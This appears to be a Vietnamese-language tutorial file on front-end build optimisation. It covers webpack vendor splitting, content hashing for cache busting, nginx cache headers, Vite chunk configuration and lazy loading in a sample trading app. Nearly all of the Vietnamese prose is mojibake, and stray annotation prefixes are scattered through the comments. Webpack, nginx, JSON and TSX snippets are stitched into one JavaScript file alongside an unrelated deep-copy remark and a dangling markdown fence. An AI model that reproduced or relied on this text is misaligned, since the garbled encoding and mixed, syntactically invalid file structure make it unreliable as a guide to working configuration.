module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // T√°ch React v√†o vendor chunk
        vendor: {
          test: /[\\/]node_modules[\\/](react|react-dom)[\\/]/,
          name: 'vendor',
          priority: 10
        },
        // T√°ch libraries kh√°c
        libs: {
          test: /[\\/]node_modules[\\/]/,
          name: 'libs',
          priority: 5
        }
      }
    }
  }
};

// üéØ K·∫øt qu·∫£:
// - vendor.js (React + ReactDOM) ‚Üí cache l√¢u d√†i (√≠t thay ƒë·ªïi)
// - libs.js (Lodash, Axios...) ‚Üí cache l√¢u d√†i
// - main.js (App code) ‚Üí thay ƒë·ªïi th∆∞·ªùng xuy√™n

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 5. Content Hashing (Hash File) - Cache Busting
 // Ch√∫ gi·∫£i: ============================================

/**
 * üîê CONTENT HASHING L√Ä G√å? (What is Content Hashing?)
 * 
 * Content Hashing l√† k·ªπ thu·∫≠t th√™m HASH (chu·ªói k√Ω t·ª± duy nh·∫•t) v√†o t√™n file
 * d·ª±a tr√™n N·ªòI DUNG c·ªßa file. Khi n·ªôi dung thay ƒë·ªïi ‚Üí hash thay ƒë·ªïi ‚Üí t√™n file m·ªõi.
 * 
 * üéØ M·ª§C ƒê√çCH:
 * ‚úÖ Cache Busting: B·∫Øt bu·ªôc browser t·∫£i file m·ªõi khi code thay ƒë·ªïi
 * ‚úÖ Long-term Caching: Cache files kh√¥ng ƒë·ªïi v√¥ th·ªùi h·∫°n (1 nƒÉm)
 * ‚úÖ Performance: Gi·∫£m requests cho files kh√¥ng ƒë·ªïi
 */

 // Ch√∫ gi·∫£i: ===================================================
// üî• V·∫§N ƒê·ªÄ: KH√îNG D√ôNG HASH (The Problem)
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Build #1 (Version 1.0 - Th·ª© 2)
 // Ch√∫ gi·∫£i: dist/
//   ‚îú‚îÄ‚îÄ main.js        (100 KB) ‚Üê T√™n file KH√îNG ƒê·ªîI
//   ‚îî‚îÄ‚îÄ vendor.js      (300 KB) ‚Üê T√™n file KH√îNG ƒê·ªîI

 // Ch√∫ gi·∫£i: index.html
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.js"></script>     ‚Üê Browser cache file n√†y
  <script src="/vendor.js"></script>   ‚Üê Browser cache file n√†y
</head>
</html>
*/

 // Ch√∫ gi·∫£i: üö® SCENARIO:
 // Ch√∫ gi·∫£i: 1. User A visit website ‚Üí Download main.js, vendor.js
// 2. Browser cache v·ªõi header: Cache-Control: max-age=31536000 (1 nƒÉm)
 // Ch√∫ gi·∫£i: 3. Developer deploy version m·ªõi (Th·ª© 3)
 // Ch√∫ gi·∫£i: ‚Üí main.js code m·ªõi (fix bug)
//    ‚Üí Nh∆∞ng T√äN FILE V·∫™N L√Ä main.js ‚ùå

 // Ch√∫ gi·∫£i: Build #2 (Version 1.1 - Th·ª© 3 - FIX BUG)
 // Ch√∫ gi·∫£i: dist/
//   ‚îú‚îÄ‚îÄ main.js        (105 KB) ‚Üê N·ªôi dung M·ªöI, t√™n file C≈® ‚ùå
//   ‚îî‚îÄ‚îÄ vendor.js      (300 KB) ‚Üê Kh√¥ng ƒë·ªïi

 // Ch√∫ gi·∫£i: 4. User A quay l·∫°i website
//    ‚Üí Browser d√πng main.js t·ª´ CACHE (version c≈©) ‚ùå
//    ‚Üí User KH√îNG th·∫•y bug fix! üò±
//    ‚Üí Ph·∫£i Ctrl+F5 (hard refresh) ƒë·ªÉ t·∫£i file m·ªõi

// ‚ùå V·∫§N ƒê·ªÄ:
// - User th·∫•y version c≈© (c√≥ bug)
 // Ch√∫ gi·∫£i: - Ph·∫£i hard refresh manually
// - Kh√¥ng ki·ªÉm so√°t ƒë∆∞·ª£c cache

 // Ch√∫ gi·∫£i: ===================================================
// ‚úÖ GI·∫¢I PH√ÅP: CONTENT HASHING
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Build #1 (Version 1.0 - Th·ª© 2)
 // Ch√∫ gi·∫£i: dist/
 // Ch√∫ gi·∫£i: ‚îú‚îÄ‚îÄ main.a3f8b2c1.js     (100 KB) ‚Üê Hash t·ª´ N·ªòI DUNG
 // Ch√∫ gi·∫£i: ‚îî‚îÄ‚îÄ vendor.9d4e7f1a.js   (300 KB) ‚Üê Hash t·ª´ N·ªòI DUNG

 // Ch√∫ gi·∫£i: index.html (auto-generated)
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.a3f8b2c1.js"></script>     ‚Üê T√™n file c√≥ hash
  <script src="/vendor.9d4e7f1a.js"></script>   ‚Üê T√™n file c√≥ hash
</head>
</html>
*/

 // Ch√∫ gi·∫£i: Browser cache:
// - main.a3f8b2c1.js: cached 1 nƒÉm ‚úÖ
// - vendor.9d4e7f1a.js: cached 1 nƒÉm ‚úÖ

 // Ch√∫ gi·∫£i: Build #2 (Version 1.1 - Th·ª© 3 - FIX BUG)
 // Ch√∫ gi·∫£i: dist/
//   ‚îú‚îÄ‚îÄ main.f7c5d3a9.js     (105 KB) ‚Üê HASH M·ªöI v√¨ n·ªôi dung ƒë·ªïi! ‚úÖ
//   ‚îî‚îÄ‚îÄ vendor.9d4e7f1a.js   (300 KB) ‚Üê HASH C≈® v√¨ n·ªôi dung KH√îNG ƒë·ªïi ‚úÖ

 // Ch√∫ gi·∫£i: index.html (auto-generated)
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.f7c5d3a9.js"></script>     ‚Üê T√™n file M·ªöI! ‚úÖ
  <script src="/vendor.9d4e7f1a.js"></script>   ‚Üê T√™n file C≈® (from cache) ‚úÖ
</head>
</html>
*/

 // Ch√∫ gi·∫£i: User A quay l·∫°i website:
// 1. Browser fetch index.html (lu√¥n fresh, kh√¥ng cache)
// 2. Browser th·∫•y main.f7c5d3a9.js (t√™n M·ªöI!)
//    ‚Üí T·∫£i file m·ªõi (v√¨ ch∆∞a c√≥ trong cache) ‚úÖ
// 3. Browser th·∫•y vendor.9d4e7f1a.js (t√™n C≈®)
//    ‚Üí D√πng t·ª´ cache (ti·∫øt ki·ªám 300 KB bandwidth) ‚úÖ

// ‚úÖ L·ª¢I √çCH:
// - User LU√îN th·∫•y version m·ªõi (t·ª± ƒë·ªông)
// - Kh√¥ng c·∫ßn hard refresh
// - Cache files kh√¥ng ƒë·ªïi v√¥ th·ªùi h·∫°n (vendor.js)
// - Ch·ªâ download files ƒë√£ thay ƒë·ªïi (main.js)

 // Ch√∫ gi·∫£i: ===================================================
// üîß C√ÅCH HO·∫†T ƒê·ªòNG C·ª¶A CONTENT HASHING
 // Ch√∫ gi·∫£i: ===================================================

/**
 * QUY TR√åNH T·∫†O HASH:
 * 
 * 1. Bundler ƒë·ªçc N·ªòI DUNG file (main.js)
 * 2. Ch·∫°y hashing algorithm (MD5, SHA-256, etc.) tr√™n n·ªôi dung
 * 3. T·∫°o hash string (VD: a3f8b2c1d5e9f7a2)
 * 4. L·∫•y 8 k√Ω t·ª± ƒë·∫ßu (a3f8b2c1) ƒë·ªÉ t√™n file ng·∫Øn g·ªçn
 * 5. Rename file: main.js ‚Üí main.a3f8b2c1.js
 * 6. Update index.html v·ªõi t√™n file m·ªõi
 */

// V√≠ d·ª• minh h·ªça:
const crypto = require('crypto');
const fs = require('fs');

// ƒê·ªçc n·ªôi dung file
const fileContent = fs.readFileSync('dist/main.js', 'utf-8');

 // Ch√∫ gi·∫£i: T·∫°o hash t·ª´ n·ªôi dung (MD5)
const hash = crypto
  .createHash('md5')              // D√πng MD5 algorithm
  .update(fileContent) // Ch√∫ gi·∫£i: Hash n·ªôi dung file
  .digest('hex') // Ch√∫ gi·∫£i: Convert sang hex string
  .substring(0, 8);               // L·∫•y 8 k√Ω t·ª± ƒë·∫ßu

console.log(hash); // Ch√∫ gi·∫£i: "a3f8b2c1"

 // Ch√∫ gi·∫£i: Rename file
const newFileName = `main.${hash}.js`; // Ch√∫ gi·∫£i: "main.a3f8b2c1.js"

 // Ch√∫ gi·∫£i: ===================================================
// üìä HASH STRATEGIES (C√°c Chi·∫øn L∆∞·ª£c Hash)
 // Ch√∫ gi·∫£i: ===================================================

/**
 * 1Ô∏è‚É£ [contenthash] - RECOMMENDED (Khuy√™n d√πng)
 *    Hash d·ª±a tr√™n N·ªòI DUNG file
 *    ‚Üí File kh√¥ng ƒë·ªïi ‚Üí hash kh√¥ng ƒë·ªïi ‚Üí cache hi·ªáu qu·∫£
 * 
 * 2Ô∏è‚É£ [chunkhash]
 *    Hash d·ª±a tr√™n CHUNK (group of modules)
 *    ‚Üí Modules trong c√πng chunk share hash
 * 
 * 3Ô∏è‚É£ [hash] (fullhash)
 *    Hash d·ª±a tr√™n TO√ÄN B·ªò build
 *    ‚Üí Build m·ªõi ‚Üí T·∫§T C·∫¢ files ƒë·ªïi hash (kh√¥ng t·ªëi ∆∞u)
 */

 // Ch√∫ gi·∫£i: webpack.config.js (Webpack)
module.exports = {
  output: {
    path: path.resolve(__dirname, 'dist'),
    
 // Ch√∫ gi·∫£i: ‚úÖ RECOMMENDED: [contenthash] - hash theo n·ªôi dung
    filename: '[name].[contenthash:8].js',
 // Ch√∫ gi·∫£i: ‚Üë            ‚Üë
    //             name chunk    8 k√Ω t·ª± hash
    
 // Ch√∫ gi·∫£i: Output: main.a3f8b2c1.js, vendor.9d4e7f1a.js
    
 // Ch√∫ gi·∫£i: Alternative strategies:
 // Ch√∫ gi·∫£i: filename: '[name].[chunkhash:8].js',  // Hash theo chunk
    // filename: '[name].[fullhash:8].js',   // Hash to√†n b·ªô build (kh√¥ng khuy√™n)
  },
  
  optimization: {
 // Ch√∫ gi·∫£i: ‚ö†Ô∏è QUAN TR·ªåNG: moduleIds: 'deterministic'
    // ‚Üí ƒê·∫£m b·∫£o module IDs kh√¥ng ƒë·ªïi gi·ªØa c√°c builds
    // ‚Üí vendor.js hash KH√îNG ƒë·ªïi n·∫øu code kh√¥ng ƒë·ªïi
    moduleIds: 'deterministic',
    
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendor',
          priority: 10
        }
      }
    }
  }
};

 // Ch√∫ gi·∫£i: vite.config.ts (Vite)
import { defineConfig } from 'vite';

export default defineConfig({
  build: {
    rollupOptions: {
      output: {
        // ‚úÖ Vite t·ª± ƒë·ªông d√πng content hash
        entryFileNames: '[name].[hash].js', // Ch√∫ gi·∫£i: Entry files
        chunkFileNames: '[name].[hash].js', // Ch√∫ gi·∫£i: Lazy chunks
        assetFileNames: '[name].[hash].[ext]', // Ch√∫ gi·∫£i: CSS, images, fonts
      }
    }
  }
});

 // Ch√∫ gi·∫£i: ===================================================
// üéØ REAL-WORLD SCENARIO (K·ªãch B·∫£n Th·ª±c T·∫ø)
 // Ch√∫ gi·∫£i: ===================================================

/**
 * üè¢ SCENARIO: E-commerce Website
 * 
 * BEFORE Content Hashing:
 * ‚ùå Deploy version m·ªõi ‚Üí Users v·∫´n th·∫•y version c≈© (cached)
 * ‚ùå Ph·∫£i ƒë·ª£i cache expire (1 tu·∫ßn) ho·∫∑c user hard refresh
 * ‚ùå Bug fix kh√¥ng ƒë·∫øn users ngay l·∫≠p t·ª©c
 * 
 * AFTER Content Hashing:
 * ‚úÖ Deploy version m·ªõi ‚Üí Users T·ª∞ ƒê·ªòNG th·∫•y version m·ªõi
 * ‚úÖ Vendor files (React, libraries) cached v√¥ th·ªùi h·∫°n
 * ‚úÖ Ch·ªâ download files ƒë√£ thay ƒë·ªïi
 */

 // Ch√∫ gi·∫£i: Build Timeline Example:
/*
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ         CONTENT HASHING TIMELINE                           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                            ‚îÇ
‚îÇ  üìÖ MONDAY (Build #1 - Initial Release)                   ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ dist/                                                ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ index.html                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ main.a3f8b2c1.js        (50 KB - app code)     ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ vendor.9d4e7f1a.js      (300 KB - React, etc.) ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ‚îÄ styles.c4d9e2f3.css     (10 KB)                ‚îÇ
‚îÇ  ‚îÇ                                                        ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ User A visit:                                        ‚îÇ
‚îÇ      ‚úÖ Download all files (360 KB total)                ‚îÇ
‚îÇ      ‚úÖ Browser cache: 1 nƒÉm                              ‚îÇ
‚îÇ                                                            ‚îÇ
‚îÇ  üìÖ TUESDAY (Build #2 - Fix Bug in App Code)             ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ dist/                                                ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ index.html                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ main.f7c5d3a9.js        (52 KB) ‚Üê HASH M·ªöI ‚úÖ  ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ vendor.9d4e7f1a.js      (300 KB) ‚Üê C≈® ‚úÖ       ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ‚îÄ styles.c4d9e2f3.css     (10 KB) ‚Üê C≈® ‚úÖ        ‚îÇ
‚îÇ  ‚îÇ                                                        ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ User A revisit:                                      ‚îÇ
‚îÇ      ‚úÖ Download: index.html + main.f7c5d3a9.js (52 KB) ‚îÇ
‚îÇ      ‚úÖ From cache: vendor.js + styles.css (310 KB)     ‚îÇ
‚îÇ      üìä Bandwidth saved: 86% (310/360)                   ‚îÇ
‚îÇ                                                            ‚îÇ
‚îÇ  üìÖ FRIDAY (Build #3 - Upgrade React 18.2 ‚Üí 18.3)        ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ dist/                                                ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ index.html                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ main.f7c5d3a9.js        (52 KB) ‚Üê C≈® ‚úÖ        ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ‚îÄ vendor.b8f1a4c7.js      (305 KB) ‚Üê HASH M·ªöI ‚úÖ ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ‚îÄ styles.c4d9e2f3.css     (10 KB) ‚Üê C≈® ‚úÖ        ‚îÇ
‚îÇ  ‚îÇ                                                        ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ User A revisit:                                      ‚îÇ
‚îÇ      ‚úÖ Download: index.html + vendor.b8f1a4c7.js       ‚îÇ
‚îÇ      ‚úÖ From cache: main.js + styles.css                ‚îÇ
‚îÇ      üìä Smart caching: Ch·ªâ t·∫£i files ƒë·ªïi!               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
*/

 // Ch√∫ gi·∫£i: ===================================================
 // Ch√∫ gi·∫£i: üîê CACHE HEADERS v·ªõi CONTENT HASH
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: Nginx configuration (production)
server {
  location / {
    root /var/www/html;
    
    # ‚ö†Ô∏è index.html: KH√îNG cache (lu√¥n fresh)
    location = /index.html {
      add_header Cache-Control "no-cache, no-store, must-revalidate";
      add_header Pragma "no-cache";
      add_header Expires "0";
    }
    
    # ‚úÖ Hashed files: Cache v√¥ th·ªùi h·∫°n (1 nƒÉm)
    location ~* \.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot)$ {
      # N·∫øu file c√≥ hash trong t√™n (VD: main.a3f8b2c1.js)
      if ($request_filename ~* "\.([a-f0-9]{8})\.(js|css)$") {
        add_header Cache-Control "public, max-age=31536000, immutable";
        # immutable = Browser KH√îNG revalidate (ti·∫øt ki·ªám requests)
      }
    }
  }
}

 // Ch√∫ gi·∫£i: ===================================================
// üì¶ HTML INJECTION (T·ª± ƒê·ªông Inject Hash Files)
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: HtmlWebpackPlugin (Webpack)
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  plugins: [
    new HtmlWebpackPlugin({
      template: './public/index.html', // Ch√∫ gi·∫£i: Template HTML
      inject: 'body',                  // Inject scripts v√†o <body>
      minify: true // Ch√∫ gi·∫£i: Minify HTML
    })
  ]
};

// public/index.html (Template - KH√îNG c√≥ hash)
/*
<!DOCTYPE html>
<html>
<head>
  <title>My App</title>
</head>
<body>
  <div id="root"></div>
  <!-- Scripts s·∫Ω ƒë∆∞·ª£c inject t·ª± ƒë·ªông -->
</body>
</html>
*/

// dist/index.html (Generated - C√ì hash)
/*
<!DOCTYPE html>
<html>
<head>
  <title>My App</title>
  <link href="/styles.c4d9e2f3.css" rel="stylesheet"> ‚Üê Auto-injected
</head>
<body>
  <div id="root"></div>
  <script src="/vendor.9d4e7f1a.js"></script>  ‚Üê Auto-injected
  <script src="/main.a3f8b2c1.js"></script>    ‚Üê Auto-injected
</body>
</html>
*/

 // Ch√∫ gi·∫£i: ===================================================
// üéØ BEST PRACTICES (Th·ª±c H√†nh T·ªët Nh·∫•t)
 // Ch√∫ gi·∫£i: ===================================================

/**
 * ‚úÖ DO (N√äN):
 * 1. D√πng [contenthash] cho production builds
 * 2. Cache hashed files: max-age=31536000 (1 nƒÉm)
 * 3. KH√îNG cache index.html (lu√¥n fresh)
 * 4. D√πng moduleIds: 'deterministic' (Webpack)
 * 5. Split vendor code (React, libraries) ra ri√™ng
 * 6. T√™n file: [name].[contenthash:8].js (8 k√Ω t·ª± hash)
 * 
 * ‚ùå DON'T (KH√îNG N√äN):
 * 1. D√πng [hash] (fullhash) ‚Üí t·∫•t c·∫£ files ƒë·ªïi hash
 * 2. Cache index.html ‚Üí users kh√¥ng th·∫•y version m·ªõi
 * 3. Kh√¥ng split vendor ‚Üí download l·∫°i React m·ªói deploy
 * 4. Hash qu√° d√†i (>12 k√Ω t·ª±) ‚Üí t√™n file d√†i
 */

 // Ch√∫ gi·∫£i: ===================================================
// üìä PERFORMANCE METRICS (S·ªë Li·ªáu Hi·ªáu Su·∫•t)
 // Ch√∫ gi·∫£i: ===================================================

/**
 * üéØ REAL APP EXAMPLE (·ª®ng d·ª•ng th·ª±c t·∫ø):
 * 
 * WITHOUT Content Hashing:
 * ‚îú‚îÄ‚îÄ Build #1: Users download 1.2 MB
 * ‚îú‚îÄ‚îÄ Build #2 (1 tu·∫ßn sau): Users download 1.2 MB (l·∫°i!) ‚ùå
 * ‚îú‚îÄ‚îÄ Build #3 (1 tu·∫ßn sau): Users download 1.2 MB (l·∫°i!) ‚ùå
 * ‚îî‚îÄ‚îÄ Total: 3.6 MB trong 3 tu·∫ßn
 * 
 * WITH Content Hashing:
 * ‚îú‚îÄ‚îÄ Build #1: Users download 1.2 MB
 * ‚îÇ   ‚îú‚îÄ‚îÄ main.js: 200 KB
 * ‚îÇ   ‚îú‚îÄ‚îÄ vendor.js: 800 KB
 * ‚îÇ   ‚îî‚îÄ‚îÄ styles.css: 200 KB
 * ‚îÇ
 * ‚îú‚îÄ‚îÄ Build #2: Users download 220 KB ‚úÖ
 * ‚îÇ   ‚îú‚îÄ‚îÄ main.js: 220 KB (changed - hash m·ªõi)
 * ‚îÇ   ‚îú‚îÄ‚îÄ vendor.js: from cache (kh√¥ng ƒë·ªïi)
 * ‚îÇ   ‚îî‚îÄ‚îÄ styles.css: from cache (kh√¥ng ƒë·ªïi)
 * ‚îÇ
 * ‚îú‚îÄ‚îÄ Build #3: Users download 150 KB ‚úÖ
 * ‚îÇ   ‚îú‚îÄ‚îÄ main.js: from cache (kh√¥ng ƒë·ªïi)
 * ‚îÇ   ‚îú‚îÄ‚îÄ vendor.js: from cache (kh√¥ng ƒë·ªïi)
 * ‚îÇ   ‚îî‚îÄ‚îÄ styles.css: 150 KB (changed - hash m·ªõi)
 * ‚îÇ
 * ‚îî‚îÄ‚îÄ Total: 1.57 MB trong 3 tu·∫ßn
 * 
 * üìä Bandwidth Saved: 2.03 MB (56% nh·ªè h∆°n!) üöÄ
 * ‚ö° Load Time: Nhanh h∆°n 3-5x (t·ª´ cache)
 */

 // Ch√∫ gi·∫£i: ===================================================
// üî• COMMON MISTAKES (L·ªói Th∆∞·ªùng G·∫∑p)
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 1: Cache index.html
 // Ch√∫ gi·∫£i: nginx.conf
location = /index.html {
  add_header Cache-Control "max-age=3600"; // Ch√∫ gi·∫£i: ‚ùå SAI! Cache 1 gi·ªù
}
// ‚Üí Users kh√¥ng th·∫•y deploy m·ªõi trong 1 gi·ªù!

 // Ch√∫ gi·∫£i: ‚úÖ FIX:
location = /index.html {
  add_header Cache-Control "no-cache"; // ‚úÖ ƒê√öNG! Lu√¥n fresh
}

// ‚ùå MISTAKE 2: D√πng [hash] thay v√¨ [contenthash]
filename: '[name].[hash:8].js'; // ‚ùå T·∫•t c·∫£ files ƒë·ªïi hash m·ªói build
// ‚Üí vendor.js hash m·ªõi d√π code kh√¥ng ƒë·ªïi ‚Üí users t·∫£i l·∫°i 800 KB ‚ùå

 // Ch√∫ gi·∫£i: ‚úÖ FIX:
filename: '[name].[contenthash:8].js'; // ‚úÖ Ch·ªâ files ƒë·ªïi m·ªõi c√≥ hash m·ªõi

// ‚ùå MISTAKE 3: Kh√¥ng split vendor code
 // Ch√∫ gi·∫£i: ‚Üí main.js ch·ª©a app + React (1 MB)
 // Ch√∫ gi·∫£i: ‚Üí M·ªói l·∫ßn s·ª≠a app ‚Üí users t·∫£i l·∫°i c·∫£ React ‚ùå

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Split vendor
optimization: {
  splitChunks: {
    cacheGroups: {
      vendor: {
        test: /[\\/]node_modules[\\/]/,
        name: 'vendor'
      }
    }
  }
}

 // Ch√∫ gi·∫£i: ===================================================
// üí° SUMMARY (T√≥m T·∫Øt)
 // Ch√∫ gi·∫£i: ===================================================

/**
 * üîê CONTENT HASHING:
 * 
 * ‚úÖ L√Ä G√å?
 *    - Th√™m hash v√†o t√™n file d·ª±a tr√™n n·ªôi dung
 *    - File thay ƒë·ªïi ‚Üí hash m·ªõi ‚Üí t√™n file m·ªõi
 * 
 * ‚úÖ HO·∫†T ƒê·ªòNG SAO?
 *    1. Bundler hash n·ªôi dung file (MD5/SHA-256)
 *    2. T·∫°o string hash (a3f8b2c1)
 *    3. Rename: main.js ‚Üí main.a3f8b2c1.js
 *    4. Update index.html v·ªõi t√™n m·ªõi
 * 
 * ‚úÖ D√ôNG ƒê·ªÇ L√ÄM G√å?
 *    - Cache Busting: Users lu√¥n th·∫•y version m·ªõi
 *    - Long-term Caching: Cache files kh√¥ng ƒë·ªïi v√¥ th·ªùi h·∫°n
 *    - Performance: Ch·ªâ download files ƒë√£ thay ƒë·ªïi
 *    - Bandwidth Saving: Ti·∫øt ki·ªám 50-80% bandwidth
 * 
 * ‚úÖ KHI N√ÄO D√ôNG?
 *    - LU√îN LU√îN d√πng cho production builds!
 *    - K·∫øt h·ª£p v·ªõi vendor splitting
 *    - K·∫øt h·ª£p v·ªõi aggressive caching (1 nƒÉm)
 * 
 * ‚úÖ C√îNG C·ª§:
 *    - Webpack: output.filename = '[name].[contenthash:8].js'
 *    - Vite: T·ª± ƒë·ªông enable
 *    - Rollup: rollup-plugin-hash
 */

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 6. Real-world Trading App Example
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üéØ Setup ESLint + Prettier + Tree-shaking + Code Splitting

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "name": "trading-app",
  "sideEffects": [
    "*.css",
    "./src/polyfills.ts" // Polyfills c√≥ side-effects
  ],
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "lint": "eslint . --ext .ts,.tsx",
    "format": "prettier --write \"src/**/*.{ts,tsx}\""
  }
}

 // Ch√∫ gi·∫£i: vite.config.ts (Vite = modern bundler)
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  build: {
    sourcemap: true, // Ch√∫ gi·∫£i: ‚úÖ Generate source maps

    rollupOptions: {
      output: {
 // Ch√∫ gi·∫£i: üì¶ Manual chunks cho better caching
        manualChunks: {
          'vendor': ['react', 'react-dom'],
          'charts': ['recharts'], // Ch√∫ gi·∫£i: Heavy chart library
          'utils': ['lodash-es', 'date-fns']
        }
      }
    }
  }
});

 // Ch√∫ gi·∫£i: üìÇ App structure v·ªõi code splitting
 // Ch√∫ gi·∫£i: src/App.tsx
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

 // Ch√∫ gi·∫£i: ‚úÖ Lazy load pages
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Trading = lazy(() => import('./pages/Trading'));
const Portfolio = lazy(() => import('./pages/Portfolio'));
const Analytics = lazy(() => import('./pages/Analytics')); // Ch√∫ gi·∫£i: Heavy (charts)

export default function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/trading" element={<Trading />} />
        <Route path="/portfolio" element={<Portfolio />} />
        <Route path="/analytics" element={<Analytics />} /> {/* Load khi c·∫ßn */}
      </Routes>
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: src/utils/index.ts (Tree-shakable exports)
 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Named exports
export { calculateProfit } from './profit-calculator';
export { validateOrder } from './order-validator';
export { formatCurrency } from './formatters';

// KH√îNG d√πng: export * from './profit-calculator' (barrel export)

 // Ch√∫ gi·∫£i: src/pages/Analytics.tsx (Lazy load heavy components)
import { lazy, Suspense } from 'react';

 // Ch√∫ gi·∫£i: ‚úÖ Lazy load chart component (recharts lib ~500KB)
const ProfitChart = lazy(() => import('../components/ProfitChart'));

export default function Analytics() {
  return (
    <div>
      <h1>Analytics</h1>

      <Suspense fallback={<div>Loading chart...</div>}>
        <ProfitChart /> {/* Load khi render page n√†y */}
      </Suspense>
    </div>
  );
}

 // Ch√∫ gi·∫£i: üéØ Build results:
 // Ch√∫ gi·∫£i: ‚úÖ main.js (50KB) - App shell + routing
// ‚úÖ vendor.js (150KB) - React + ReactDOM (cache l√¢u)
// ‚úÖ charts.js (500KB) - Recharts (load khi v√†o /analytics)
 // Ch√∫ gi·∫£i: ‚úÖ dashboard.chunk.js (30KB)
 // Ch√∫ gi·∫£i: ‚úÖ trading.chunk.js (40KB)
 // Ch√∫ gi·∫£i: ‚úÖ portfolio.chunk.js (35KB)
 // Ch√∫ gi·∫£i: ‚úÖ analytics.chunk.js (20KB)

// üí° L·ª£i √≠ch:
// - Initial load: 50KB + 150KB = 200KB (thay v√¨ 825KB)
// - User v√†o /analytics ‚Üí Load th√™m charts.js (500KB) khi c·∫ßn
 // Ch√∫ gi·∫£i: - Faster initial render, better UX
```

---

**Best Practices:**

1. **ESLint + Prettier**

   ```bash
   # Install
   npm install -D eslint prettier eslint-config-prettier
   npm install -D @typescript-eslint/parser @typescript-eslint/eslint-plugin

   # Run on pre-commit (husky + lint-staged)
   npx husky install
   npx husky add .husky/pre-commit "npx lint-staged"
   ```

